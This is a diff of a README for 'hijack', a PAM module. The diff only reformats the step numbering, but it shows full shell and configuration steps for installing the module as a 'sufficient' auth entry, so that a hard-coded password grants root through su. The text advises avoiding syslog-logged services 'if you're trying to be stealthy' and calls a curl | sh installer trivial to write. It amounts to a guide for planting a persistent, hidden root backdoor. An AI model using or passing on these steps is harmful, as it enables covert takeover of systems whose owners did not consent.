@@ -19,7 +19,7 @@ For those of you who aren't familiar with the unix build system: just pop open a
 ## Installing
 Installing is also a walk in the park, but it does require you to spend a minute or so on the admin account of the machine in question. It'll work over SSH (or any other remote PTY) as well of course, so physical access is not necessarily a prerequisite in every case. The process itself remains more or less identical across different machines running the same OS, and can easily be automated with a shell script – which in turn speeds installation even further, especially when paired with a `curl | sh`-style pipe command. Such a script is intentionally not included for (hopefully) obvious reasons. If you require this or similar functionality though, rest assured that it's completely trivial to implement by oneself.
 
-1. Move a copy of the shared library file `hijack.so` into your PAM library path. The precise location differs according to operating system – on some systems it can be ascertained by simply scrolling to the end of PAM's manual page ('man pam'), others might have you resorting to something like `locate pam_rootok` which, while perfectly functional, is a little bit messy in my opinion. On Mac OS X however, I've found that it's nearly always `/usr/lib/pam/`.
+**(1)** Move a copy of the shared library file `hijack.so` into your PAM library path. The precise location differs according to operating system – on some systems it can be ascertained by simply scrolling to the end of PAM's manual page ('man pam'), others might have you resorting to something like `locate pam_rootok` which, while perfectly functional, is a little bit messy in my opinion. On Mac OS X however, I've found that it's nearly always `/usr/lib/pam/`.
 ```
     $ sudo -i
     Password:
@@ -27,14 +27,14 @@ Installing is also a walk in the park, but it does require you to spend a minute
 ```
 The OSX enthusiasts among you may have flinched at the `.so` file extension – for once, I'm actually not being a newb: PAM recommends that modules be named this way even when they are technically in Mach-O `dylib` format.
 
-2. Change the permission attributes of `/usr/lib/pam/hijack.so` to match the other "real" PAM modules in `/usr/lib/pam`. On my MacBook, this is `root:wheel` ownership and mode 0444. In this case I downloaded the file as root, so already had the correct ownership – but I'll just `chown` it anyway for kicks.
+**(2)** Change the permission attributes of `/usr/lib/pam/hijack.so` to match the other "real" PAM modules in `/usr/lib/pam`. On my MacBook, this is `root:wheel` ownership and mode 0444. In this case I downloaded the file as root, so already had the correct ownership – but I'll just `chown` it anyway for kicks.
 ```
     # cd /usr/lib/pam
     # chown root:wheel hijack.so
     # chmod 0444 hijack.so
 ```
 
-3. Edit the configuration files in `/etc/pam.d` so that `hijack.so` has the `sufficient` role for the services you'd like to have it affect. Keep in mind that some services (e.g. sudo) log their activity with syslog, so if you're trying to be stealthy you might want to think twice as to how you're getting root. Lastly, make sure the entry is at the top, or PAM won't check it first. Here's my `/etc/pam.d/su` file, for example:
+**(3)** Edit the configuration files in `/etc/pam.d` so that `hijack.so` has the `sufficient` role for the services you'd like to have it affect. Keep in mind that some services (e.g. sudo) log their activity with syslog, so if you're trying to be stealthy you might want to think twice as to how you're getting root. Lastly, make sure the entry is at the top, or PAM won't check it first. Here's my `/etc/pam.d/su` file, for example:
 ```
 auth       sufficient     hijack.so
 auth       sufficient     pam_rootok.so
@@ -46,7 +46,7 @@ session    required       pam_launchd.so
 ```
 This will cause `su`'s PAM calls to route through hijack, returning successful if the password given is equivalent to the one hard-coded into library, and falling back to OpenDirectory if not. Note that there is no need to remove or comment out the pam_group line as hijack will return successful before PAM has the opportunity to evaluate it.
 
-4. Test it out!
+**(4)**  Test it out!
 ```
 $ su
 Password:
